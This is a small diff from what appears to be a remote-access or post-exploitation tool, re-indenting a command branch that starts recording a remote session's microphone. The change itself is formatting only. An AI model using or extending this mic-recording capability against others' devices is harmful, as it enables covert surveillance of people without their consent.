@@ -85,6 +85,6 @@ class command:
                 else:
                     h.info_error("Local directory: "+rp+": does not exist!")
         
-       elif cmd_data['args'].split()[0] == "start":
-           h.info_general("Recording mic...")
-           h.info_general(session.send_command(cmd_data))
+        elif cmd_data['args'].split()[0] == "start":
+            h.info_general("Recording mic...")
+            h.info_general(session.send_command(cmd_data))
